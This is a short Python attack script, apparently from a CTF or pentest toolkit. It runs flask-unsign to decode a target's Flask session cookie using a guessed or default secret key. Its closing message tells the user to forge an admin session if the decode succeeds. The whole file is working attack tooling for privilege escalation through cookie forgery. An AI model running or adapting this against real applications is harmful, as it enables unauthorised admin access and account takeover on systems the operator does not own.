#!/usr/bin/env python3
# Requires: pip install flask-unsign
import os, subprocess, sys
secret = os.getenv('SECRET', 'dev-secret-key-change-in-production')
cookie = os.getenv('COOKIE', '')
if not cookie:
    print('Set COOKIE env var from target session cookie')
    sys.exit(1)
cmd = ['flask-unsign', '--decode', '--cookie', cookie, '--secret', secret]
print('[+] running:', ' '.join(cmd))
subprocess.run(cmd, check=False)
print('[*] If decode works, forge admin session with flask-unsign --sign ...')
